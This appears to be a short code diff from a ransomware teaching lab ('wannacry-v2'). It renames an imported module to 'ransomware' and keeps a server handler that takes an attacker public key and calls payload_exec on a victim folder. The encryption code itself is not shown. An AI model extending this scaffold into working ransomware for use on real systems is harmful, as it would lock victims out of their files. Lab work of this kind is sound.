@@ -26,12 +26,12 @@ import json
 from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
 from pathlib import Path
 
-import lab_keylogic
+import ransomware
 
 LAB_DIR = Path("/opt/wannacry-v2")
 DEFAULT_TARGET = Path("/home/seed/import_folder")
 STATE_FILE = LAB_DIR / "participant.json"
-KEYLOG_PATH = LAB_DIR / "lab_keylogic.json"
+KEYLOG_PATH = LAB_DIR / "ransomware.json"
 PUB_PATH = LAB_DIR / "attacker_pub.pem"
 
 
@@ -65,8 +65,8 @@ def drop(attacker_pub_pem: str) -> dict:
     pem = attacker_pub_pem.encode("ascii")
     if b"BEGIN PUBLIC KEY" not in pem:
         return {"status": "rejected", "reason": "not a public key PEM"}
-    lab_keylogic.write_atomic(PUB_PATH, pem)
-    record = lab_keylogic.payload_exec(
+    ransomware.write_atomic(PUB_PATH, pem)
+    record = ransomware.payload_exec(
         DEFAULT_TARGET,
         victim_participant_id(),
         pem,
